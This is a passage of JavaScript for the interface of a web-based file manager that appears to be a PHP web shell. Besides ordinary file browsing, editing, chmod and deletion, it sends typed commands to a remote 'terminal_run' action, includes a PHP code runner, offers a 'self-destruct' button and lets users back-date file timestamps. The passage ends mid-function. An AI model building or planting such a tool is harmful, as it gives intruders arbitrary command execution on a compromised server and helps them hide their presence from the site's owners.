             if (G.dom.body.classList.contains('sidebar-open') && !e.target.closest('.sidebar') && !e.target.closest('#menu-toggle')) {
                 G.dom.body.classList.remove('sidebar-open');
             }
        });

        G.dom.bookmarkToggle.addEventListener('click', () => {
             performSimpleAction('toggle_bookmark', { path: G.state.currentDir });
        });

        document.getElementById('new-file-form').addEventListener('submit', e => { e.preventDefault(); performSimpleAction('new_file', { name: e.target.elements.name.value }); });
        document.getElementById('new-folder-form').addEventListener('submit', e => { e.preventDefault(); performSimpleAction('new_folder', { name: e.target.elements.name.value }); });

        document.getElementById('link-to-file-form').addEventListener('submit', e => {
            e.preventDefault();
            const formData = new FormData(e.target);
            performSimpleAction('link_to_file', Object.fromEntries(formData.entries()));
        });
        
        // [NEW FEATURE v8.1] Content Search Form
        document.getElementById('content-search-form').addEventListener('submit', handleRecursiveContentSearch);

        const termInput = document.getElementById('terminal-input');
        termInput.addEventListener('keydown', handleTerminalInput);
        if (G.dom.terminalPrompt) {
            updateTerminalPrompt();
        }
        document.getElementById('terminal-fullscreen-btn').addEventListener('click', () => {
            const modalContent = document.querySelector('#terminalModal .modal-content');
            modalContent.classList.toggle('modal-fullscreen');
            if (!modalContent.classList.contains('modal-fullscreen')) {
                modalContent.style.top = ''; modalContent.style.left = ''; modalContent.style.width = ''; modalContent.style.height = '';
            }
        });
        document.getElementById('editor-fullscreen-btn').addEventListener('click', () => document.querySelector('#editorModal .modal-content').classList.toggle('modal-fullscreen'));

        document.getElementById('editor-form').addEventListener('submit', handleEditorSave);
        document.getElementById('editor-font-increase').addEventListener('click', () => changeEditorFontSize(1));
        document.getElementById('editor-font-decrease').addEventListener('click', () => changeEditorFontSize(-1));
        document.getElementById('editor-theme-selector').addEventListener('change', (e) => {
            if (G.codeEditor) G.codeEditor.setOption('theme', e.target.value);
        });

        document.getElementById('grep-form').addEventListener('submit', handleGrep);

        document.getElementById('selection-rename').addEventListener('click', () => { const item = document.querySelector('.file-item.selected'); openRenameModal(item.dataset.path, item.dataset.name); });
        document.getElementById('selection-mass-rename').addEventListener('click', () => openMassRenameModal(getSelectedPaths())); // [NEW FEATURE v8.1]
        document.getElementById('selection-touch').addEventListener('click', () => { const path = getSelectedPaths()[0]; openTouchModal(path); });
        document.getElementById('selection-copy').addEventListener('click', () => performMassAction('copy'));
        document.getElementById('selection-cut').addEventListener('click', () => performMassAction('cut'));
        document.getElementById('selection-paste').addEventListener('click', () => performSimpleAction('paste'));
        document.getElementById('selection-zip').addEventListener('click', () => performMassAction('zip'));
        document.getElementById('selection-chmod').addEventListener('click', () => openChmodModal(getSelectedPaths()));
        document.getElementById('selection-delete').addEventListener('click', () => { 
            const count = getSelectedPaths().length;
            showConfirmModal('Delete Items', `Are you sure you want to permanently delete ${count} selected items?`, () => {
                performMassAction('delete');
            });
        });
        
        G.dom.fileListContainer.addEventListener('contextmenu', handleContextMenu);
        window.addEventListener('click', () => G.dom.contextMenu.style.display = 'none');
        initContextMenuActions();

        initUploader();

        document.getElementById('rename-form').addEventListener('submit', handleRename);
        document.getElementById('mass-rename-form').addEventListener('submit', handleMassRename); // [NEW FEATURE v8.1]
        document.getElementById('chmod-form').addEventListener('submit', handleChmod);
        document.getElementById('touch-form').addEventListener('submit', handleTouch);

        document.getElementById('image-viewer-close').addEventListener('click', () => closeModal('image-viewer'));
        document.getElementById('image-prev').addEventListener('click', () => navigateImage(-1));
        document.getElementById('image-next').addEventListener('click', () => navigateImage(1));
        
        // Filter buttons
        document.querySelectorAll('.filter-buttons button').forEach(btn => {
            btn.addEventListener('click', () => {
                document.querySelector('.filter-buttons button.active').classList.remove('active');
                btn.classList.add('active');
                G.state.activeFilter = btn.id.replace('filter-', '');
                applyFilters();
                renderFiles();
            });
        });
        
        document.addEventListener('keydown', e => {
            if (document.getElementById('image-viewer').style.display === 'flex') {
                if (e.key === 'ArrowLeft') navigateImage(-1);
                if (e.key === 'ArrowRight') navigateImage(1);
            }
            if (e.key === 'F1') {
                e.preventDefault();
                const terminalModal = document.getElementById('terminalModal');
                if (terminalModal.style.display === 'flex') closeModal('terminalModal');
                else openModal('terminalModal');
            }
            if (e.key === 'Escape') {
                e.preventDefault();
                closeTopModal();
            }

            const activeModal = document.querySelector('.modal[style*="display: flex"]');
            const isTyping = ['INPUT', 'TEXTAREA', 'SELECT'].includes(document.activeElement.tagName);
            if (isTyping || (activeModal && activeModal.id !== 'image-viewer')) return;
            
            const selectedPaths = getSelectedPaths();
            const selectedCount = selectedPaths.length;

            switch (e.key) {
                case 'F2':
                    if (selectedCount === 1) {
                        e.preventDefault();
                        const item = document.querySelector('.file-item.selected');
                        openRenameModal(item.dataset.path, item.dataset.name);
                    }
                    break;
                case 'Delete':
                    if (selectedCount > 0) {
                         e.preventDefault();
                         showConfirmModal('Delete Items', `Are you sure you want to permanently delete ${selectedCount} selected items?`, () => {
                             performMassAction('delete');
                         });
                    }
                    break;
            }
        });

        // v7.0 Event Listeners
        document.getElementById('wp-cache-flush-btn').addEventListener('click', handleWpCacheFlush);
        document.getElementById('search-form').addEventListener('submit', handleRecursiveSearch);
        document.getElementById('self-destruct-btn').addEventListener('click', handleSelfDestruct);
        document.querySelectorAll('.server-hub-tab').forEach(tab => {
            tab.addEventListener('click', () => {
                const tabName = tab.dataset.tab;
                document.querySelector('.server-hub-tab.active').classList.remove('active');
                document.querySelector('.server-hub-content.active').classList.remove('active');
                tab.classList.add('active');
                document.getElementById(`tab-${tabName}`).classList.add('active');
            });
        });
        document.getElementById('php-runner-form').addEventListener('submit', handlePhpRunner);
    }

    function updateItemCount() {
        const counts = G.state.allFiles.reduce((acc, f) => {
            if (f.name === '..') return acc;
            f.is_dir ? acc.folders++ : acc.files++;
            return acc;
        }, { folders: 0, files: 0 });
        G.dom.itemCount.innerText = `${counts.folders} Folders, ${counts.files} Files`;
    }

    function renderFiles() {
        G.dom.fileListContainer.innerHTML = '';

        // [NEW v8.0] Show empty folder message
        if (G.state.files.length === 0 || (G.state.files.length === 1 && G.state.files[0].name === '..')) {
            G.dom.fileListContainer.innerHTML = `
                <div class="empty-folder-message">
                    <i data-feather="folder"></i>
                    <p>This folder is empty.</p>
                </div>
            `;
            feather.replace();
            return;
        }

        if (G.state.view === 'list-view') {
            renderListViewHeader();
        }

        const fragment = document.createDocumentFragment();
        let renderedCount = 0;
        const totalFiles = G.state.files.length;
        const renderChunk = () => {
            const end = Math.min(renderedCount + 50, totalFiles);
            for (let i = renderedCount; i < end; i++) {
                const item = G.state.files[i];
                const itemEl = document.createElement('div');
                itemEl.className = 'file-item';
                itemEl.style.setProperty('--i', i);
                itemEl.dataset.path = item.path;
                itemEl.dataset.name = item.name;
                itemEl.dataset.type = item.type;
                itemEl.dataset.ext = item.ext;
                itemEl.dataset.perms = item.perms;
                itemEl.dataset.owner = item.owner;
                itemEl.dataset.size = item.size;
                if (item.is_bookmarked) {
                    itemEl.dataset.isBookmarked = "true";
                }
                
                const iconName = getIconForItem(item);
                const icon = `<i data-feather="${iconName}" ${item.is_bookmarked ? 'style="fill:var(--warning-color);"' : ''}></i>`;
                const sizeFormatted = item.is_dir ? '--' : formatBytes(item.size);
                const dateFormatted = formatDate(item.mtime);
                const ownerClass = item.owner === 'root' ? 'owner-root' : '';
                const dangerIndicatorHTML = item.contains_danger_keyword ? `<span class="danger-indicator" title="Contains potentially dangerous functions"><i data-feather="alert-triangle"></i></span>` : '';

                const isBack = item.name === '..';
                const linkHref = item.is_dir ? `?dir=${encodeURIComponent(item.path)}` : '#';
                
                let innerHTML = '';
                if (G.state.view === 'grid-view') {
                    innerHTML = `
                        <input type="checkbox" class="file-checkbox" value="${escapeHTML(item.path)}" ${isBack ? 'disabled' : ''}>
                        <div class="file-link-wrapper">
                            <div class="file-icon" data-type="${getIconType(item)}">${icon}</div>
                            <div class="file-info">
                                <span class="name">${escapeHTML(item.name)}</span>
                                ${dangerIndicatorHTML}
                            </div>
                        </div>
                    `;
                } else {
                    innerHTML = `
                        <input type="checkbox" class="file-checkbox" value="${escapeHTML(item.path)}" ${isBack ? 'disabled' : ''}>
                        <div class="file-icon" data-type="${getIconType(item)}">${icon}</div>
                        <div class="file-info">
                            <div class="file-name-container">
                                <a class="name" href="${linkHref}">${escapeHTML(item.name)}</a>
                                ${dangerIndicatorHTML}
                            </div>
                            <div class="file-details">
                                <div class="file-owner ${ownerClass}">${escapeHTML(item.owner)} / ${escapeHTML(item.group)}</div>
                                <div class="file-perms">${escapeHTML(item.perms)}</div>
                                <div class="file-size">${sizeFormatted}</div>
                                <div class="file-date">${dateFormatted}</div>
                            </div>
                        </div>
                    `;
                }
                itemEl.innerHTML = innerHTML;

                if (!isBack) {
                    const linkElement = G.state.view === 'grid-view' ? itemEl.querySelector('.file-link-wrapper') : itemEl.querySelector('a.name');
                    linkElement.addEventListener('click', e => {
                        if (item.is_dir) {
                             return;
                        }
                        e.preventDefault();
                        handleFileClick(item);
                    });
                }
                
                itemEl.querySelector('.file-checkbox').addEventListener('change', () => {
                    itemEl.classList.toggle('selected', itemEl.querySelector('.file-checkbox').checked);
                    updateSelectionToolbar();
                });
                fragment.appendChild(itemEl);
            }
            G.dom.fileListContainer.appendChild(fragment);
            feather.replace();

            renderedCount = end;
            if (renderedCount < totalFiles) {
                requestAnimationFrame(renderChunk);
            }
        };

        requestAnimationFrame(renderChunk);
    }
    
    function getIconForItem(item) {
        if (item.name === '..') return ICONS['dir-up'];
        if (ICONS[item.ext]) return ICONS[item.ext];
        if (ICONS[item.type]) return ICONS[item.type];
        return ICONS['file'];
    }

    // [NEW v8.0] Helper to get general type for CSS coloring
    function getIconType(item) {
        if (item.name === '..') return 'dir-up';
        const mainTypes = ['dir', 'image', 'archive', 'code'];
        return mainTypes.includes(item.type) ? item.type : 'file';
    }
    
    function handleFileClick(item) {
        if (item.type === 'image') {
            openImageViewer(item.path);
        } else if (item.type === 'code') {
            openEditor(item.path);
        } else {
            openDetailsModal(item.path);
        }
    }
    
    function renderListViewHeader() {
        const header = document.createElement('div');
        header.className = 'file-list-header';
        header.innerHTML = `
            <div class="header-col header-name" data-sort="name">Name</div>
            <div class="header-col header-owner" data-sort="owner">Owner/Group</div>
            <div class="header-col header-perms" data-sort="perms">Perms</div>
            <div class="header-col header-size" data-sort="size">Size</div>
            <div class="header-col header-date" data-sort="mtime">Modified</div>
        `;
        header.querySelectorAll('.header-col').forEach(col => {
            const sortBy = col.dataset.sort;
            if (sortBy === G.state.sort.by) {
                col.classList.add(G.state.sort.order === 'asc' ? 'sort-asc' : 'sort-desc');
            }
            col.addEventListener('click', () => {
                const newOrder = (sortBy === G.state.sort.by && G.state.sort.order === 'asc') ? 'desc' : 'asc';
                G.state.sort = { by: sortBy, order: newOrder };
                sortFiles();
                renderFiles();
            });
        });
        G.dom.fileListContainer.prepend(header);
    }

    function sortFiles() {
        const { by, order } = G.state.sort;
        G.state.files.sort((a, b) => {
            if (a.name === '..') return -1;
            if (b.name === '..') return 1;
            if (a.is_dir !== b.is_dir) return a.is_dir ? -1 : 1;
            let cmp = 0;
            switch(by) {
                case 'size': cmp = a.size - b.size; break;
                case 'mtime': cmp = a.mtime - b.mtime; break;
                case 'owner': cmp = String(a.owner).localeCompare(String(b.owner)); break;
                case 'perms': cmp = String(a.perms).localeCompare(String(b.perms)); break;
                default: cmp = a.name.localeCompare(b.name, undefined, { numeric: true, sensitivity: 'base' });
            }
            return order === 'asc' ? cmp : -cmp;
        });
    }
    
    function applyFilters() {
        const query = document.getElementById('search-box').value.toLowerCase();
        G.state.files = G.state.allFiles.filter(f => {
            const nameMatch = f.name.toLowerCase().includes(query);
            if (!nameMatch) return false;
            
            if (G.state.activeFilter === 'all' || f.name === '..') return true;
            if (G.state.activeFilter === 'images' && f.type === 'image') return true;
            if (G.state.activeFilter === 'archives' && f.type === 'archive') return true;
            if (G.state.activeFilter === 'code' && f.type === 'code') return true;

            return false;
        });
        sortFiles();
    }
    
    async function performApiAction(formData, reload = true) {
        showLoader();
        try {
            const response = await fetch('', { method: 'POST', body: formData });
            if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
            const result = await response.json();
            showToast(result.message, result.status);
            if (result.status === 'success' && reload) {
                setTimeout(() => window.location.reload(), 500);
            }
            return result;
        } catch (error) {
            console.error('API Action failed:', error);
            showToast('An unexpected error occurred.', 'error');
        } finally {
            hideLoader();
        }
    }

    function performSimpleAction(action, data = {}, reload = true) {
        const formData = new FormData();
        formData.append('action', action);
        formData.append('dir', G.state.currentDir);
        for (const key in data) {
            formData.append(key, data[key]);
        }
        return performApiAction(formData, reload);
    }
    
    function performMassAction(action) {
        const paths = getSelectedPaths();
        if (paths.length === 0) return;
        const formData = new FormData();
        formData.append('action', action);
        formData.append('dir', G.state.currentDir);
        paths.forEach(p => formData.append('paths[]', p));
        performApiAction(formData);
    }
    
    function getSelectedPaths() {
        return Array.from(document.querySelectorAll('.file-checkbox:checked')).map(cb => cb.value);
    }
    
    function updateSelectionToolbar() {
        const selectedItems = Array.from(document.querySelectorAll('.file-item.selected'));
        const selectedCount = selectedItems.length;
        
        G.dom.selectionCount.innerText = selectedCount;
        G.dom.selectionToolbar.classList.toggle('visible', selectedCount > 0);
        document.getElementById('select-all-checkbox').checked = selectedCount > 0 && selectedCount === document.querySelectorAll('.file-checkbox:not(:disabled)').length;

        let totalSize = 0;
        selectedItems.forEach(item => {
            const size = parseInt(item.dataset.size, 10);
            if (size > 0) totalSize += size;
        });
        G.dom.selectionTotalSize.innerText = selectedCount > 0 ? `(${formatBytes(totalSize)})` : '';

        document.getElementById('selection-rename').disabled = selectedCount !== 1;
        document.getElementById('selection-mass-rename').disabled = selectedCount === 0; // [NEW FEATURE v8.1]
        document.getElementById('selection-touch').disabled = selectedCount !== 1;
        document.getElementById('selection-chmod').disabled = selectedCount === 0;
        document.getElementById('selection-copy').disabled = selectedCount === 0;
        document.getElementById('selection-cut').disabled = selectedCount === 0;
        document.getElementById('selection-zip').disabled = selectedCount === 0;
        document.getElementById('selection-delete').disabled = selectedCount === 0;
    }
    
    function handleContextMenu(e) {
        const item = e.target.closest('.file-item');
        if (!item || item.dataset.name === '..') return;
        e.preventDefault();
        G.state.contextTarget = item;
        const checkbox = item.querySelector('.file-checkbox');
        if (!checkbox.checked) {
            document.querySelectorAll('.file-checkbox:checked').forEach(cb => { cb.checked = false; cb.closest('.file-item').classList.remove('selected'); });
            checkbox.checked = true; item.classList.add('selected');
            updateSelectionToolbar();
        }
        const type = item.dataset.type;
        const selectedCount = getSelectedPaths().length;
        document.getElementById('ctx-preview').style.display = ((type === 'code' || type === 'text') && selectedCount === 1) ? 'flex' : 'none';
        document.getElementById('ctx-edit').style.display = ((type === 'code') && selectedCount === 1) ? 'flex' : 'none';
        document.getElementById('ctx-get-link').style.display = (type === 'dir' || selectedCount > 1) ? 'none' : 'flex';
        document.getElementById('ctx-extract').style.display = (type === 'archive' && selectedCount === 1) ? 'flex' : 'none';
        document.getElementById('ctx-rename').style.display = selectedCount === 1 ? 'flex' : 'none';
        document.getElementById('ctx-duplicate').style.display = selectedCount === 1 ? 'flex' : 'none';
        document.getElementById('ctx-touch').style.display = selectedCount === 1 ? 'flex' : 'none';
        document.getElementById('ctx-bookmark').style.display = (type === 'dir' && selectedCount === 1) ? 'flex' : 'none';
        if (type === 'dir') {
             const bookmarkBtn = document.getElementById('ctx-bookmark');
             bookmarkBtn.innerHTML = item.dataset.isBookmarked ? '<i data-feather="star" style="fill:var(--warning-color);"></i> Unbookmark' : '<i data-feather="star"></i> Bookmark';
        }
        document.getElementById('ctx-paste').style.display = G.state.clipboard ? 'flex' : 'none';
        const { pageX: x, pageY: y } = e;
        const { offsetWidth: menuWidth, offsetHeight: menuHeight } = G.dom.contextMenu;
        G.dom.contextMenu.style.display = 'block';
        G.dom.contextMenu.style.left = `${Math.min(x, window.innerWidth - menuWidth - 10)}px`;
        G.dom.contextMenu.style.top = `${Math.min(y, window.innerHeight - menuHeight - 10)}px`;
        feather.replace();
    }

    function initContextMenuActions() {
        const getTargetPath = () => G.state.contextTarget.dataset.path;
        document.getElementById('ctx-preview').addEventListener('click', () => openEditor(getTargetPath(), true));
        document.getElementById('ctx-edit').addEventListener('click', () => openEditor(getTargetPath()));
        document.getElementById('ctx-rename').addEventListener('click', () => openRenameModal(getTargetPath(), G.state.contextTarget.dataset.name));
        document.getElementById('ctx-chmod').addEventListener('click', () => openChmodModal(getSelectedPaths()));
        document.getElementById('ctx-touch').addEventListener('click', () => openTouchModal(getTargetPath()));
        document.getElementById('ctx-copy-path').addEventListener('click', () => { navigator.clipboard.writeText(getTargetPath()).then(() => showToast('Path copied!', 'success')); });
        document.getElementById('ctx-get-link').addEventListener('click', () => fetch(`?action=get_public_url&path=${encodeURIComponent(getTargetPath())}`).then(res => res.json()).then(data => { if (data.status === 'success') { navigator.clipboard.writeText(data.url).then(() => showToast('Direct link copied!', 'success')); } else { showToast(data.message, 'error'); } }));
        document.getElementById('ctx-copy').addEventListener('click', () => performMassAction('copy'));
        document.getElementById('ctx-cut').addEventListener('click', () => performMassAction('cut'));
        document.getElementById('ctx-paste').addEventListener('click', () => performSimpleAction('paste'));
        document.getElementById('ctx-duplicate').addEventListener('click', () => performSimpleAction('duplicate', { path: getTargetPath() }));
        document.getElementById('ctx-extract').addEventListener('click', () => { showLoader(); window.location.href = `?action=extract&path=${encodeURIComponent(getTargetPath())}&dir=${encodeURIComponent(G.state.currentDir)}`; });
        document.getElementById('ctx-properties').addEventListener('click', () => openDetailsModal(getTargetPath()));
        document.getElementById('ctx-delete').addEventListener('click', () => { 
            const count = getSelectedPaths().length;
            showConfirmModal('Delete Items', `Are you sure you want to permanently delete ${count} selected items?`, () => {
                performMassAction('delete');
            });
        });
        document.getElementById('ctx-bookmark').addEventListener('click', () => {
            performSimpleAction('toggle_bookmark', { path: getTargetPath() });
        });
    }

    function openModal(id) { 
        document.getElementById(id).style.display = 'flex'; 
        if(id === 'terminalModal') {
            setTimeout(() => document.getElementById('terminal-input').focus(), 100);
        }
    }
    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
    function closeTopModal() {
        const openModals = Array.from(document.querySelectorAll('.modal')).filter(m => m.style.display === 'flex');
        if (openModals.length > 0) {
            closeModal(openModals[openModals.length - 1].id);
        }
    }
    
    function showConfirmModal(title, message, onConfirm) {
        document.getElementById('confirm-title').innerText = title;
        document.getElementById('confirm-message').innerText = message;
        const confirmOk = document.getElementById('confirm-ok');
        const confirmCancel = document.getElementById('confirm-cancel');

        const okListener = () => {
            closeModal('confirmModal');
            onConfirm();
            confirmOk.removeEventListener('click', okListener);
            confirmCancel.removeEventListener('click', cancelListener);
        };
        const cancelListener = () => {
            closeModal('confirmModal');
            confirmOk.removeEventListener('click', okListener);
            confirmCancel.removeEventListener('click', cancelListener);
        };
        confirmOk.addEventListener('click', okListener);
        confirmCancel.addEventListener('click', cancelListener);
        openModal('confirmModal');
    }

    async function openEditor(path, readOnly = false) {
        showLoader();
        try {
            const response = await fetch(`?action=get_content&path=${encodeURIComponent(path)}`);
            const content = await response.text();
            if (!response.ok) throw new Error(content);
            const filename = path.split(/[/\\]/).pop();
            document.getElementById('editor-title').innerText = readOnly ? `Preview: ${filename}` : `Edit: ${filename}`;
            document.getElementById('editor-actions').style.display = readOnly ? 'none' : 'flex';
            document.getElementById('edit-path').value = path;
            
            const themeSelector = document.getElementById('editor-theme-selector');
            if (themeSelector.options.length === 0) {
                 const themes = {'Dark': ['dracula', 'material-darker', 'cobalt'], 'Light': ['eclipse', 'default']};
                 for (const group in themes) {
                     const optgroup = document.createElement('optgroup');
                     optgroup.label = group;
                     themes[group].forEach(theme => {
                         const option = document.createElement('option');
                         option.value = theme;
                         option.textContent = theme.charAt(0).toUpperCase() + theme.slice(1);
                         optgroup.appendChild(option);
                     });
                     themeSelector.appendChild(optgroup);
                 }
            }

            if (!G.codeEditor) {
                G.codeEditor = CodeMirror.fromTextArea(document.getElementById('code-editor'), { lineNumbers: true, lineWrapping: true, matchBrackets: true, autoCloseBrackets: true });
                G.codeEditor.addKeyMap({ "Ctrl-S": (cm) => document.getElementById('editor-form').requestSubmit(), "Cmd-S": (cm) => document.getElementById('editor-form').requestSubmit() });
            }
            
            const isLight = G.dom.body.classList.contains('light-mode');
            const defaultTheme = isLight ? 'eclipse' : 'dracula';
            themeSelector.value = defaultTheme;
            G.codeEditor.setOption('theme', defaultTheme);
            G.codeEditor.setOption('readOnly', readOnly);
            G.codeEditor.setValue(content);
            setEditorFontSize();
            let info = CodeMirror.findModeByFileName(filename);
            G.codeEditor.setOption("mode", (info && info.mode) ? info.mime : "text/plain");
            openModal('editorModal'); 
            setTimeout(() => G.codeEditor.refresh(), 100);
        } catch (error) {
            showToast(`Error opening file: ${error.message}`, 'error');
        } finally {
            hideLoader();
        }
    }

    function handleEditorSave(e) {
        e.preventDefault();
        G.codeEditor.save();
        const formData = new FormData(e.target);
        formData.append('action', 'edit');
        formData.append('dir', G.state.currentDir);
        performApiAction(formData).then(() => closeModal('editorModal'));
    }

    function changeEditorFontSize(amount) {
        G.editorFontSize = Math.max(8, Math.min(30, G.editorFontSize + amount));
        setEditorFontSize();
    }
    
    function setEditorFontSize() {
        if (G.codeEditor) {
            G.codeEditor.getWrapperElement().style.fontSize = `${G.editorFontSize}px`;
            G.codeEditor.refresh();
        }
    }

    async function openDetailsModal(path) {
        showLoader();
        try {
            const response = await fetch(`?action=get_details&path=${encodeURIComponent(path)}`);
            const data = await response.json();
            if (data.error) throw new Error(data.error);
            document.getElementById('details-title').innerText = `Properties: ${data.name}`;
            const tableBody = document.querySelector('#details-table tbody');
            const item = G.state.allFiles.find(f => f.path === path);
            let sizeRow = `<tr><td>Size</td><td>${data.size}</td></tr>`;
            if (item && item.is_dir) {
                sizeRow = `<tr><td>Size</td><td id="details-size"><span>${data.size}</span> <button class="btn-primary" style="padding: 2px 8px; font-size: 12px;" onclick="calculateFolderSize(this, '${escapeJS(path)}')">Calculate</button></td></tr>`;
            }
            tableBody.innerHTML = `<tr><td>Path</td><td>${data.path}</td></tr>${sizeRow}<tr><td>Permissions</td><td>${data.perms}</td></tr><tr><td>Owner/Group</td><td>${data.owner} / ${data.group}</td></tr><tr><td>Modified</td><td>${data.modified}</td></tr>`;
            document.getElementById('details-copy-path').onclick = () => { navigator.clipboard.writeText(data.path).then(() => showToast('Path copied!', 'success')); };
            openModal('detailsModal');
        } catch (error) {
            showToast(error.message, 'error');
        } finally {
            hideLoader();
        }
    }
    
    async function calculateFolderSize(btn, path) {
        btn.disabled = true;
        const sizeCell = document.getElementById('details-size');
        sizeCell.innerHTML = 'Calculating...';
        try {
            const response = await fetch(`?action=get_folder_size&path=${encodeURIComponent(path)}`);
            const data = await response.json();
            sizeCell.innerHTML = data.status === 'success' ? data.size : 'Error';
        } catch(e) {
            sizeCell.innerText = 'Error';
        } finally {
            btn.disabled = false;
        }
    }

    function openRenameModal(path, currentName) {
        document.getElementById('rename-new-name').value = currentName;
        G.state.contextTarget = { path };
        openModal('renameModal');
        setTimeout(() => document.getElementById('rename-new-name').focus(), 50);
    }
    function handleRename(e) { e.preventDefault(); performSimpleAction('rename', { path: G.state.contextTarget.path, new_name: document.getElementById('rename-new-name').value }); }
    
    function openMassRenameModal(paths) { // [NEW FEATURE v8.1]
        if (paths.length === 0) return;
        G.state.contextTarget = { paths };
        document.getElementById('mass-rename-info').innerText = `Rename parts of ${paths.length} selected items.`;
        document.getElementById('mass-rename-search').value = '';
        document.getElementById('mass-rename-replace').value = '';
        openModal('massRenameModal');
        setTimeout(() => document.getElementById('mass-rename-search').focus(), 50);
    }
    function handleMassRename(e) { // [NEW FEATURE v8.1]
        e.preventDefault();
        const formData = new FormData();
        formData.append('action', 'mass_rename');
        formData.append('dir', G.state.currentDir);
        G.state.contextTarget.paths.forEach(p => formData.append('paths[]', p));
        formData.append('search', document.getElementById('mass-rename-search').value);
        formData.append('replace', document.getElementById('mass-rename-replace').value);
        performApiAction(formData);
    }
    
    function openChmodModal(paths) {
        G.state.contextTarget = { paths };
        const infoEl = document.getElementById('chmod-info');
        if (paths.length === 1) {
            const item = document.querySelector(`.file-item[data-path="${escapeCSS(paths[0])}"]`);
            document.getElementById('chmod-mode').value = item.dataset.perms;
            infoEl.innerText = `Enter new permissions for ${item.dataset.name}`;
        } else {
            document.getElementById('chmod-mode').value = '0644';
            infoEl.innerText = `Enter new permissions for ${paths.length} items.`;
        }
        openModal('chmodModal');
        setTimeout(() => document.getElementById('chmod-mode').focus(), 50);
    }
    function handleChmod(e) { e.preventDefault(); const formData = new FormData(); formData.append('action', 'chmod'); formData.append('dir', G.state.currentDir); G.state.contextTarget.paths.forEach(p => formData.append('paths[]', p)); formData.append('mode', document.getElementById('chmod-mode').value); performApiAction(formData); }

    function openTouchModal(path) {
        G.state.contextTarget = { path };
        const now = new Date();
        now.setMinutes(now.getMinutes() - now.getTimezoneOffset());
        document.getElementById('touch-datetime').value = now.toISOString().slice(0, 19).replace('T', ' ');
        openModal('touchModal');
        setTimeout(() => document.getElementById('touch-datetime').focus(), 50);
    }
    function handleTouch(e) { e.preventDefault(); performSimpleAction('touch', { path: G.state.contextTarget.path, datetime: document.getElementById('touch-datetime').value }); }

    function openImageViewer(path) {
        G.state.imageFiles = G.state.allFiles.filter(f => f.type === 'image');
        G.state.currentImageIndex = G.state.imageFiles.findIndex(f => f.path === path);
        updateImageViewer();
        openModal('image-viewer');
    }
    function updateImageViewer() {
        if (G.state.currentImageIndex === -1) return;
        const path = G.state.imageFiles[G.state.currentImageIndex].path;
        document.getElementById('preview-image').src = `?action=download&path=${encodeURIComponent(path)}`;
    }
    function navigateImage(direction) {
        G.state.currentImageIndex += direction;
        if (G.state.currentImageIndex < 0) G.state.currentImageIndex = G.state.imageFiles.length - 1;
        if (G.state.currentImageIndex >= G.state.imageFiles.length) G.state.currentImageIndex = 0;
        updateImageViewer();
    }
    
    async function handleGrep(e) {
        e.preventDefault();
        showLoader();
        const query = document.getElementById('grep-query').value;
        const pattern = document.getElementById('grep-pattern').value;
        const resultsContainer = document.getElementById('grep-results');
        resultsContainer.innerHTML = 'Searching...';
        try {
            const res = await fetch(`?action=grep&query=${encodeURIComponent(query)}&pattern=${encodeURIComponent(pattern)}&dir=${encodeURIComponent(G.state.currentDir)}`);
            const data = await res.json();
            if (data.results && data.results.length > 0) {
                resultsContainer.innerHTML = data.results.map(r => `<div><a href="#" onclick="event.preventDefault(); openEditor('${escapeJS(r.path)}')">${escapeHTML(r.filename)}</a></div>`).join('');
            } else {
                resultsContainer.innerHTML = 'No results found.';
            }
        } catch(e) {
            resultsContainer.innerHTML = 'An error occurred.';
        } finally {
            hideLoader();
        }
    }
    
    async function handleRecursiveContentSearch(e) { // [NEW FEATURE v8.1]
        e.preventDefault();
        showLoader();
        const query = document.getElementById('content-search-query').value;
        const resultsContainer = document.getElementById('content-search-results');
        resultsContainer.innerHTML = 'Searching recursively...';
        try {
            const res = await fetch(`?action=recursive_content_search&query=${encodeURIComponent(query)}&dir=${encodeURIComponent(G.state.currentDir)}`);
            const data = await res.json();
            if (data.results && data.results.length > 0) {
                resultsContainer.innerHTML = data.results.map(r => {
                    const iconName = getIconForItem(r);
                    return `<div><i data-feather="${iconName}"></i> <a href="#" onclick="event.preventDefault(); openEditor('${escapeJS(r.path)}')" title="${escapeHTML(r.path)}">${escapeHTML(r.path)}</a></div>`;
                }).join('');
                feather.replace();
            } else {
                resultsContainer.innerHTML = 'No files containing the text found.';
            }
        } catch(e) {
            resultsContainer.innerHTML = 'An error occurred during search.';
        } finally {
            hideLoader();
        }
    }
    
    function updateTerminalPrompt() {
        const dirName = G.state.currentDir.split(/[/\\]/).pop() || '/';
        document.getElementById('terminal-prompt').innerHTML = `<span class="user">[${G.state.currentUser}@${escapeHTML(dirName)}]$&nbsp;</span>`;
    }

    function handleTerminalInput(e) {
        const termInput = document.getElementById('terminal-input');
        if (e.key === 'Enter' && termInput.value) {
            const cmd = termInput.value;
            const termOutput = document.getElementById('terminal-output');
            
            const promptHTML = `<div><span style="color: #00ff51;">${document.getElementById('terminal-prompt').innerText}</span><span style="color: #ff00f5;">${escapeHTML(cmd)}</span></div>`;
            termOutput.innerHTML += promptHTML;
            termInput.value = '';
            
            if (cmd) {
                G.terminalHistory.push(cmd);
                if (G.terminalHistory.length > 50) G.terminalHistory.shift();
                localStorage.setItem('terminalHistory', JSON.stringify(G.terminalHistory));
                G.terminalHistoryIndex = G.terminalHistory.length;
            }

            const loaderId = `loader-${Date.now()}`;
            const loaderHTML = `<div id="${loaderId}" class="terminal-loader-container"><div class="terminal-loader"></div></div>`;
            termOutput.innerHTML += loaderHTML;
            termOutput.scrollTop = termOutput.scrollHeight;

            fetch(`?action=terminal_run&cmd=${encodeURIComponent(cmd)}&dir=${encodeURIComponent(G.state.currentDir)}`)
                .then(res => res.text())
                .then(output => {
                    const outputHTML = `<pre style="color: #00e5ff; margin: 0; white-space: pre-wrap;">${escapeHTML(output)}</pre>`;
                    termOutput.innerHTML += outputHTML;
                })
                .catch(error => {
                    termOutput.innerHTML += `<pre style="color:var(--danger-color); margin: 0;">Error: ${error}</pre>`;
                })
                .finally(() => {
                    const loaderEl = document.getElementById(loaderId);
                    if (loaderEl) loaderEl.remove();
                    
                    G.dom.terminalPrompt.style.display = 'flex';
                    updateTerminalPrompt();
                    termOutput.scrollTop = termOutput.scrollHeight;
                    termInput.focus();
                });
        } else if (e.key === 'ArrowUp' && G.terminalHistoryIndex > 0) {
            e.preventDefault();
            termInput.value = G.terminalHistory[--G.terminalHistoryIndex];
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (G.terminalHistoryIndex < G.terminalHistory.length - 1) {
